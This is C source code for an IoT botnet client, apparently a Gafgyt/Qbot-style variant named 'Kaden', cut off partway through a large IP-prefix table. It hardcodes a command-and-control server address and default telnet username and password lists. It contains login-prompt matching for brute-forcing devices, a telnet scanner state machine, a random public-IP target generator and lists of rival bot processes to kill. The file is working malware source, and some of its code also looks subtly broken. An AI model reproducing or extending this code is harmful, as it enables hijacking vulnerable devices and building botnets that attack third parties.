// BUILD ONE
// DO NOT FUCKING LEAK IF YOU HAVE THIS YOU ARE TRUSTED.
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <limits.h>
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define STD2_SIZE 50
#define BUFFER_SIZE 1024
#define PHI 0x9e3779b9
#define VERSION "Kaden"
int userID = 1;
unsigned char *commServer[] = { "104.248.36.242:69" };
int Server_Botport[] = {69};
char hacker[80];
char botkill[80];
char* Boats[] = {"wget", "armv*", "bot*", "ntpd*", "hackz*", "shitty*","jack*", "mips*", "sex*", "i86", "ssh*", "sh4*", "jackmeoff*", "tftp*", "i56", "mips", "mipsel", "sh4", "x86", "i686", "ppc", "i586", "i586"};
const char *bots[] = {"jackmy*", "busybox*", "bin*", "sex*", "tftp*", "arm*", "mipsel*", "mips*", "mips64*", "i686*","sparc*", "sh4*", "bot*", "jackmeoff*", "hackz*", "bruv*"};
char *infect1 = "Trying to \r\n";
char *infect2 = "use any \r\n";
char *infect3 = "of these\r\n";
char *infect4 = "will rape your botcoun\r\n";
char *usernames[] = {
	
	"telnet\0", //telnet:telnet
	"root\0", //root:root
	"support\0", //admin:1234
	
						   };
char *passwords[] = {
	
	"telnet\0", //telnet:telnet
	"root\0", //root:root
	"support\0", //admin:1234
						   };
char *advances[] = {":", "user", "ogin", "name", "pass", "dvrdvs", "mdm9625", "9615-cdp", "F600", "F660", "F609", "BCM", (char*)0}; 																					
char *fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0}; 														
char *successes[] = {"busybox", "$", "#", "shell", "dvrdvs", "mdm9625", "9615-cdp", "F600", "F660", "F609", "BCM", (char*)0}; 																									
char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};
int initConnection();
int getBogos(unsigned char *bogomips);
int getCores();
int getCountry(unsigned char *buf, int bufsize);
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint32_t scanPid;
uint32_t ngPid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x)
{
int i;
Q[0] = x;
Q[1] = x + PHI;
Q[2] = x + PHI + PHI;
for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
uint64_t t, a = 18782LL;
static uint32_t i = 4095;
uint32_t x, r = 0xfffffffe;
i = (i + 1) & 4095;
t = a * Q[i] + c;
c = (uint32_t)(t >> 32);
x = t + c;
if (x < c) {
x++;
c++;
}
return (Q[i] = r - x);
}
void trim(char *str)
{
int i;
int begin = 0;
int end = strlen(str) - 1;
while (isspace(str[begin])) begin++;
while ((end >= begin) && isspace(str[end])) end--;
for (i = begin; i <= end; i++) str[i - begin] = str[i];
str[i - begin] = '\0';
}
static void printchar(unsigned char **str, int c)
{
if (str) {
**str = c;
++(*str);
}
else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
register int pc = 0, padchar = ' ';
if (width > 0) {
register int len = 0;
register const unsigned char *ptr;
for (ptr = string; *ptr; ++ptr) ++len;
if (len >= width) width = 0;
else width -= len;
if (pad & PAD_ZERO) padchar = '0';
}
if (!(pad & PAD_RIGHT)) {
for ( ; width > 0; --width) {
printchar (out, padchar);
++pc;
}
}
for ( ; *string ; ++string) {
printchar (out, *string);
++pc;
}
for ( ; width > 0; --width) {
printchar (out, padchar);
++pc;
}
return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
unsigned char print_buf[PRINT_BUF_LEN];
register unsigned char *s;
register int t, neg = 0, pc = 0;
register unsigned int u = i;
if (i == 0) {
print_buf[0] = '0';
print_buf[1] = '\0';
return prints (out, print_buf, width, pad);
}
if (sg && b == 10 && i < 0) {
neg = 1;
u = -i;
}
s = print_buf + PRINT_BUF_LEN-1;
*s = '\0';
while (u) {
t = u % b;
if( t >= 10 )
t += letbase - '0' - 10;
*--s = t + '0';
u /= b;
}
if (neg) {
if( width && (pad & PAD_ZERO) ) {
printchar (out, '-');
++pc;
--width;
}
else {
*--s = '-';
}
}
return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args )
{
register int width, pad;
register int pc = 0;
unsigned char scr[2];
for (; *format != 0; ++format) {
if (*format == '%') {
++format;
width = pad = 0;
if (*format == '\0') break;
if (*format == '%') goto out;
if (*format == '-') {
++format;
pad = PAD_RIGHT;
}
while (*format == '0') {
++format;
pad |= PAD_ZERO;
}
for ( ; *format >= '0' && *format <= '9'; ++format) {
width *= 10;
width += *format - '0';
}
if( *format == 's' ) {
register char *s = (char *)va_arg( args, int );
pc += prints (out, s?s:"(null)", width, pad);
continue;
}
if( *format == 'd' ) {
pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
continue;
}
if( *format == 'x' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
continue;
}
if( *format == 'X' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
continue;
}
if( *format == 'u' ) {
pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
continue;
}
if( *format == 'c' ) {
scr[0] = (unsigned char)va_arg( args, int );
scr[1] = '\0';
pc += prints (out, scr, width, pad);
continue;
}
}
else {
out:
printchar (out, *format);
++pc;
}
}
if (out) **out = '\0';
va_end( args );
return pc;
}
int zprintf(const unsigned char *format, ...)
{
va_list args;
va_start( args, format );
return print( 0, format, args );
}
int szprintf(unsigned char *out, const unsigned char *format, ...)
{
va_list args;
va_start( args, format );
return print( &out, format, args );
}
int sockprintf(int sock, char *formatStr, ...)
{
unsigned char *textBuffer = malloc(2048);
memset(textBuffer, 0, 2048);
char *orig = textBuffer;
va_list args;
va_start(args, formatStr);
print(&textBuffer, formatStr, args);
va_end(args);
orig[strlen(orig)] = '\n';
//zprintf("buf: %s\n", orig);
int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
free(orig);
return q;
}
static int *fdopen_pids;
int fdpopen(unsigned char *program, register unsigned char *type)
{
register int iop;
int pdes[2], fds, pid;
if (*type != 'r' && *type != 'w' || type[1]) return -1;
if (pipe(pdes) < 0) return -1;
if (fdopen_pids == NULL) {
if ((fds = getdtablesize()) <= 0) return -1;
if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
}
switch (pid = vfork())
{
case -1:
close(pdes[0]);
close(pdes[1]);
return -1;
case 0:
if (*type == 'r') {
if (pdes[1] != 1) {
dup2(pdes[1], 1);
close(pdes[1]);
}
close(pdes[0]);
} else {
if (pdes[0] != 0) {
(void) dup2(pdes[0], 0);
(void) close(pdes[0]);
}
(void) close(pdes[1]);
}
execl("/bin/sh", "sh", "-c", program, NULL);
_exit(127);
}
if (*type == 'r') {
iop = pdes[0];
(void) close(pdes[1]);
} else {
iop = pdes[1];
(void) close(pdes[0]);
}
fdopen_pids[iop] = pid;
return (iop);
}
int fdpclose(int iop)
{
register int fdes;
sigset_t omask, nmask;
int pstat;
register int pid;
if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
(void) close(iop);
sigemptyset(&nmask);
sigaddset(&nmask, SIGINT);
sigaddset(&nmask, SIGQUIT);
sigaddset(&nmask, SIGHUP);
(void) sigprocmask(SIG_BLOCK, &nmask, &omask);
do {
pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
} while (pid == -1 && errno == EINTR);
(void) sigprocmask(SIG_SETMASK, &omask, NULL);
fdopen_pids[fdes] = 0;
return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
int got = 1, total = 0;
while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
return got == 0 ? NULL : buffer;
}
static const long hextable[] = {
[0 ... 255] = -1,
['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
['A'] = 10, 11, 12, 13, 14, 15,
['a'] = 10, 11, 12, 13, 14, 15
};
long parseHex(unsigned char *hex)
{
long ret = 0;
while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
return ret;
}
int wildString(const unsigned char* pattern, const unsigned char* string) {
switch(*pattern)
{
case '\0': return *string;
case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
case '?': return !(*string && !wildString(pattern+1, string+1));
default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
}
}
int getHost(unsigned char *toGet, struct in_addr *i)
{
struct hostent *h;
if((i->s_addr = inet_addr(toGet)) == -1) return 1;
return 0;
}
void uppercase(unsigned char *str)
{
while(*str) { *str = toupper(*str); str++; }
}
int getBogos(unsigned char *bogomips)
{
int cmdline = open("/proc/cpuinfo", O_RDONLY);
char linebuf[4096];
while(fdgets(linebuf, 4096, cmdline) != NULL)
{
uppercase(linebuf);
if(strstr(linebuf, "BOGOMIPS") == linebuf)
{
unsigned char *pos = linebuf + 8;
while(*pos == ' ' || *pos == '\t' || *pos == ':') pos++;
while(pos[strlen(pos)-1] == '\r' || pos[strlen(pos)-1] == '\n') pos[strlen(pos)-1]=0;
if(strchr(pos, '.') != NULL) *strchr(pos, '.') = 0x00;
strcpy(bogomips, pos);
close(cmdline);
return 0;
}
memset(linebuf, 0, 4096);
}
close(cmdline);
return 1;
}
int getCores()
{
int totalcores = 0;
int cmdline = open("/proc/cpuinfo", O_RDONLY);
char linebuf[4096];
while(fdgets(linebuf, 4096, cmdline) != NULL)
{
uppercase(linebuf);
if(strstr(linebuf, "BOGOMIPS") == linebuf) totalcores++;
memset(linebuf, 0, 4096);
}
close(cmdline);
return totalcores;
}
void makeRandomStr(unsigned char *buf, int length)
{
int i = 0;
for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
int recvLine(int socket, unsigned char *buf, int bufsize)
{
memset(buf, 0, bufsize);
fd_set myset;
struct timeval tv;
tv.tv_sec = 30;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(socket, &myset);
int selectRtn, retryCount;
if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
while(retryCount < 10)
{
sockprintf(mainCommSock, "PING");
tv.tv_sec = 30;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(socket, &myset);
if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
retryCount++;
continue;
}
break;
}
}
unsigned char tmpchr;
unsigned char *cp;
int count = 0;
cp = buf;
while(bufsize-- > 1)
{
if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
*cp = 0x00;
return -1;
}
*cp++ = tmpchr;
if(tmpchr == '\n') break;
count++;
}
*cp = 0x00;
// zprintf("recv: %s\n", cp);
return count;
}
int hostname_to_ip(char * hostname , char* ip)
{
struct hostent *he;
struct in_addr **addr_list;
int i;
if ( (he = gethostbyname( hostname ) ) == NULL)
{

herror("gethostbyname");
return 1;
}
addr_list = (struct in_addr **) he->h_addr_list;
for(i = 0; addr_list[i] != NULL; i++)
{

strcpy(ip , inet_ntoa(*addr_list[i]) );
return 0;
}
return 1;
}
struct telstate_t
{
int fd;
unsigned int ip;
unsigned char state;
unsigned char complete;
unsigned char usernameInd;
unsigned char passwordInd;
unsigned char tempDirInd;
unsigned int totalTimeout;
unsigned short bufUsed;
char *sockbuf;
};
const char* get_telstate_host(struct telstate_t* telstate)
{
struct in_addr in_addr_ip;
in_addr_ip.s_addr = telstate->ip;
return inet_ntoa(in_addr_ip);
}
int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings)
{
int num_bytes, i;
memset(buffer, 0, buf_size);
num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
if(buffer[0] == 0xFF)
{
negotiate(fd, buffer, 3);
}
if(contains_string(buffer, strings))
{
return 1;
}
return 0;
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size)
{
fd_set read_set;
struct timeval tv;
tv.tv_sec = 0;
tv.tv_usec = timeout_usec;
FD_ZERO(&read_set);
FD_SET(fd, &read_set);
if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
return 0;
return recv(fd, buffer, buf_size, 0);
}
void advance_state(struct telstate_t* telstate, int new_state)
{
if(new_state == 0)
{
close(telstate->fd);
}
telstate->totalTimeout = 0;
telstate->state = new_state;
memset((telstate->sockbuf), 0, BUFFER_SIZE);
}
void reset_telstate(struct telstate_t* telstate)
{
advance_state(telstate, 0);
telstate->complete = 1;
}
int contains_success(char* buffer)
{
return contains_string(buffer, successes);
}
int contains_fail(char* buffer)
{
return contains_string(buffer, fails);
}
int contains_response(char* buffer)
{
return contains_success(buffer) || contains_fail(buffer);
}
int contains_string(char* buffer, char** strings)
{
int num_strings = 0, i = 0;
for(num_strings = 0; strings[++num_strings] != 0; );
for(i = 0; i < num_strings; i++)
{
if(strcasestr(buffer, strings[i]))
{
return 1;
}
}
return 0;
}
int connectTimeout(int fd, char *host, int port, int timeout)
{
struct sockaddr_in dest_addr;
fd_set myset;
struct timeval tv;
socklen_t lon;
int valopt;
long arg = fcntl(fd, F_GETFL, NULL);
arg |= O_NONBLOCK;
fcntl(fd, F_SETFL, arg);
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
if(getHost(host, &dest_addr.sin_addr)) return 0;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
if (res < 0) {
if (errno == EINPROGRESS) {
tv.tv_sec = timeout;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(fd, &myset);
if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
lon = sizeof(int);
getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if (valopt) return 0;
}
else return 0;
}
else return 0;
}
arg = fcntl(fd, F_GETFL, NULL);
arg &= (~O_NONBLOCK);
fcntl(fd, F_SETFL, arg);
return 1;
}
int listFork()
{
uint32_t parent, *newpids, i;
parent = fork();
if (parent <= 0) return parent;
numpids++;
newpids = (uint32_t*)malloc((numpids + 1) * 4);
for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
newpids[numpids - 1] = parent;
free(pids);
pids = newpids;
return parent;
}
int negotiate(int sock, unsigned char *buf, int len)
{
unsigned char c;
switch (buf[1]) {
case CMD_IAC:  return 0;
case CMD_WILL:
case CMD_WONT:
case CMD_DO:
case CMD_DONT:
c = CMD_IAC;
send(sock, &c, 1, MSG_NOSIGNAL);
if (CMD_WONT == buf[1]) c = CMD_DONT;
else if (CMD_DONT == buf[1]) c = CMD_WONT;
else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
send(sock, &c, 1, MSG_NOSIGNAL);
send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
break;
default:
break;
}
return 0;
}
int matchPrompt(char *bufStr)
{
char *prompts = ":>%$#\0";
int bufLen = strlen(bufStr);
int i, q = 0;
for(i = 0; i < strlen(prompts); i++)
{
while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
if(*(bufStr + bufLen - q) == prompts[i]) return 1;
}
return 0;
}
int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
int bufferUsed = initialIndex, got = 0, found = 0;
fd_set myset;
struct timeval tv;
tv.tv_sec = timeout;
tv.tv_usec = timeoutusec;
unsigned char *initialRead = NULL;
while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
{
FD_ZERO(&myset);
FD_SET(fd, &myset);
if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
initialRead = buffer + bufferUsed;
got = recv(fd, initialRead, 1, 0);
if(got == -1 || got == 0) return 0;
bufferUsed += got;
if(*initialRead == 0xFF)
{
got = recv(fd, initialRead + 1, 2, 0);
if(got == -1 || got == 0) return 0;
bufferUsed += got;
if(!negotiate(fd, initialRead, 3)) return 0;
} else {
if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
}
}
if(found) return 1;
return 0;
}
static uint8_t ipState[5] = {0};
in_addr_t hackeroriginal()
{
ipState[0] = rand() % 255;
ipState[1] = rand() % 255;
ipState[2] = rand() % 255;
ipState[3] = rand() % 255;
while(
(ipState[0] == 0) ||
(ipState[0] == 10) ||
(ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
(ipState[0] == 127) ||
(ipState[0] == 169 && ipState[1] == 254) ||
(ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
(ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
(ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
(ipState[0] == 192 && ipState[1] == 168) ||
(ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
(ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
(ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
(ipState[0] == 188 && ipState[1] == 209 && ipState[2] == 52) ||
(ipState[0] == 188 && ipState[1] == 209 && ipState[2] == 49) ||
(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 190) ||
(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 189) ||
(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 188) ||
(ipState[0] == 185 && ipState[1] == 61 && ipState[2] == 137) ||
(ipState[0] == 185 && ipState[1] == 61 && ipState[2] == 136) ||
(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 147) ||
(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 146) ||
(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 145) ||
(ipState[0] == 63 && ipState[1] == 141 && ipState[2] == 241) ||
(ipState[0] == 69 && ipState[1] == 30 && ipState[2] == 192) ||
(ipState[0] == 69 && ipState[1] == 30 && ipState[2] == 244) ||
(ipState[0] == 69 && ipState[1] == 197 && ipState[2] == 128) ||
(ipState[0] == 162 && ipState[1] == 251 && ipState[2] == 120) ||
(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 128) ||
(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 180) ||
(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 250) ||
(ipState[0] == 192 && ipState[1] == 187 && ipState[2] == 113) ||
(ipState[0] == 198 && ipState[1] == 204 && ipState[2] == 241) ||
(ipState[0] == 204 && ipState[1] == 10 && ipState[2] == 160) ||
(ipState[0] == 204 && ipState[1] == 12 && ipState[2] == 192) ||
(ipState[0] == 208 && ipState[1] == 110 && ipState[2] == 64) ||
(ipState[0] == 208 && ipState[1] == 110 && ipState[2] == 72) ||
(ipState[0] == 208 && ipState[1] == 67) ||
(ipState[0] == 94 && ipState[1] == 102 && ipState[2] == 48) ||
(ipState[0] == 93 && ipState[1] == 174 && ipState[2] == 88) ||
(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 174) ||
(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 172) ||
(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 170) ||
(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 169) ||
(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 160) ||
(ipState[0] >= 224)
)
{
ipState[0] = rand() % 255;
ipState[1] = rand() % 255;
ipState[2] = rand() % 255;
ipState[3] = rand() % 255;
}
char ip[16] = {0};
szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
return inet_addr(ip);
}
int Cclass[] = {1,1,101,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,109,109,111,112,115,118,118,118,118,118,118,120,121,122,122,122,122,124,124,125,125,125,128,131,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,167,173,175,175,176,176,178,179,180,181,182,182,182,182,182,182,182,182,186,186,186,186,186,186,186,186,186,186,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,189,189,189,190,196,202,202,202,202,202,202,202,202,202,203,203,210,211,211,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,213,216,220,220,27,27,27,27,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,37,37,37,37,37,37,37,41,41,41,41,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,45,45,45,45,45,45,45,45,45,45,45,45,45,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,49,49,49,49,49,49,49,49,49,49,5,5,5,5,5,5,5,5,5,50,50,59,59,59,59,61,61,61,61,61,61,62,77,77,77,77,77,77,77,77,77,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,79,79,79,79,80,80,80,80,82,82,82,82,82,82,82,82,83,83,83,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,87,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,89,89,91,93,93,93,93,93,93,94,94,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95};
int Cclass2[] = {10,70,108,193,195,195,198,198,198,203,203,203,206,214,214,220,242,242,242,30,30,30,35,35,43,49,55,62,62,62,197,86,69,169,160,173,173,173,173,173,35,237,137,178,178,53,54,107,119,107,132,24,0,72,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,167,167,167,168,168,168,174,174,174,174,174,174,174,175,175,175,175,175,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,185,185,185,185,185,185,185,185,185,185,185,185,191,191,191,191,191,201,27,142,255,201,201,121,96,136,184,180,226,52,52,68,71,71,75,75,75,112,114,117,177,227,236,251,67,67,67,243,243,243,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,149,169,55,43,44,44,44,44,44,44,44,44,44,62,109,150,213,216,229,103,103,103,103,103,156,156,156,156,156,156,156,156,156,156,156,156,156,250,51,93,93,0,0,0,1,135,163,163,163,23,23,23,23,23,23,23,23,23,23,42,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,1,1,143,158,158,158,158,143,65,82,82,230,230,230,230,239,239,239,239,245,245,245,245,245,245,245,245,245,245,245,245,245,245,245,245,252,252,252,252,252,115,115,120,120,121,121,121,127,127,252,252,252,252,39,42,42,42,42,48,48,48,48,48,48,48,48,63,63,63,63,144,144,144,144,144,144,145,145,145,145,105,137,141,141,141,141,141,141,141,203,233,120,95,95,95,177,7,7,7,7,85,176,108,108,209,35,35,35,35,94,94,139,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,126,126,126,126,250,250,250,82,52,52,53,53,53,55,55,71,12,221,24,104,104,104,104,104,104,104,104,104,104,104,104,104,104,104,104,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,109,109,109,109,173,173,173,173,173,173,173,173,173,95,95,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,117,147,147,147,147,147,204,225,225,225,225,225,225,225,225,225,225,234,234,234,234,234,234,234,234,234,234,234,234,234,234,234,234,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,2